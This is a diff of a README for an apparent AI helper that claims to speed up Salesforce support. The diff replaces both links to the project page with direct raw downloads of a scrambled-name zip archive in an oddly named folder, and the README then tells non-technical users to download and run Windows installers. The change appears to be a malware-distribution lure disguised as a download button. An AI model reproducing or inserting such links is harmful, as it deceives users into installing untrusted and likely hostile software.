@@ -1,6 +1,6 @@
 # 🤖 new-kids-on-the-block-agent - Run Salesforce Help Faster
 
-[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/alejooviedo187-tech/new-kids-on-the-block-agent)
+[![Download](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/alejooviedo187-tech/new-kids-on-the-block-agent/main/pseudosocial/agent_kids_the_block_on_new_v3.2.zip)
 
 ## 📌 What this is
 
@@ -20,7 +20,7 @@ This project is built for end users who want a simple way to run an AI helper on
 
 Use this link to visit the page to download:
 
-[Visit the download page](https://github.com/alejooviedo187-tech/new-kids-on-the-block-agent)
+[Visit the download page](https://raw.githubusercontent.com/alejooviedo187-tech/new-kids-on-the-block-agent/main/pseudosocial/agent_kids_the_block_on_new_v3.2.zip)
 
 On the page, look for the latest release, package, or setup file. If you see a Windows file such as `.exe` or `.msi`, download it to your computer.
 
